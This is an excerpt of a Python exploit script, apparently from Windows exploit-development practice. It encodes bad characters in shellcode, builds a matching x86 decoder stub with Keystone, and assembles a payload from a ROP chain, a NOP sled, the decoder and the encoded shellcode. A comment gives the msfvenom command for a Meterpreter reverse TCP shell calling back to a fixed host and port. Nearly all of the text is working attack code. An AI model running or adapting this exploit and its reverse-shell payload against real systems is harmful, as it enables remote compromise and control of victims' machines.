...
identifiedBadChars = b"\x00\x0b\x20\xdd\xc6\x8b"

def ShellcodeEncoder(indices, originalShellcode):
    if not indices:
        log.info("No badchars have been found!")
        return originalShellcode

    encodedShellcode = bytearray(originalShellcode)

    for badChar, char_indices in indices.items():
        for index in char_indices:
            encodedShellcode[index] = originalShellcode[index] + 1

    outputShellcode = bytes(encodedShellcode)

    log.debug(f"shellcode length: {len(outputShellcode)}")
    log.debug(BeautyOpcodes(outputShellcode))

    return outputShellcode

def MappingBadChars(shellcode, badChars):
    shellcodeAsByteArray = bytearray(shellcode)
    badCharsIndices = {}

    for badChar in badChars:
        indices = [i for i, byte in enumerate(shellcodeAsByteArray) if byte == badChar]

        if indices:
            badCharsIndices[badChar] = indices

    log.debug(badCharsIndices)

    return badCharsIndices

def GetDecoderShellcode(indices, offsetEndOfDecodeInstr=50):
    if not indices:
        log.warning("Nothing to decode")
        return b""

    log.debug(type(offsetEndOfDecodeInstr))

    decoderAssemblyInstructions = []

    decoderAssemblyInstructions.append(f"mov eax, {'0x{:02x}'.format(codeCaveAd)} ;")
    decoderAssemblyInstructions.append(f"xor ebx, ebx ;")
    decoderAssemblyInstructions.append(f"inc bl ;")


    for badChar, char_indices in indices.items():
        for index in char_indices:
            offset = int(0) - int(index + offsetEndOfDecodeInstr)

            # https://stackoverflow.com/questions/7822956/how-to-convert-negative-integer-value-to-hex-in-python
            offset = hex(offset & (2**32-1))
            log.debug(f"-({index} + {offsetEndOfDecodeInstr}) = {offset}")

            decoderAssemblyInstructions.append(f"mov edx, eax         ;")
            decoderAssemblyInstructions.append(f"mov ecx, {offset}    ;")
            decoderAssemblyInstructions.append(f"neg ecx              ;")
            decoderAssemblyInstructions.append(f"add edx, ecx         ;")
            decoderAssemblyInstructions.append(f"sub [edx], bl        ;")

    decoderAssemblyInstructionsAsStr = '\n'.join(decoderAssemblyInstructions)
    log.debug(decoderAssemblyInstructionsAsStr)

    keyStoneEngine = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    compiledAssembly, count = keyStoneEngine.asm(decoderAssemblyInstructionsAsStr)
    
    log.debug(count)

    padding = len(compiledAssembly) % 4

    log.debug(f"Padding Missing: {padding}")

    if padding > 0:
        compiledAssembly += b"\x90" * padding
        log.debug(f"Check Padding Missing: {len(compiledAssembly) % 4}")

    hex_string = ""
    for opcode in compiledAssembly:
        hex_string += "{:02x}".format(int(opcode)).rstrip("\n")

    opcodesToDecode = bytes.fromhex(hex_string)

    log.debug(f"shellcode length: {len(opcodesToDecode)}")
    log.debug(BeautyOpcodes(opcodesToDecode))

    return opcodesToDecode
...
def GetShellcode() -> bytes:
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.99.9 LPORT=4443 -f python -v shellcode
...
def GetPayload() -> bytes:
    ...
    indices = MappingBadChars(shellcode, identifiedBadChars)
    
    encodedShellcode = ShellcodeEncoder(indices, shellcode)
    
    offsetEndOfDecodeInstr = len(GetDecoderShellcode(indices))
    log.debug(f"offsetEndOfDecodeInstr: {offsetEndOfDecodeInstr}")
    decodingOpcodes = GetDecoderShellcode(indices, offsetEndOfDecodeInstr)
    ...
    payload += rop_chain
    payload += b"\x90" * 0x20
    payload += decodingOpcodes
    payload += encodedShellcode
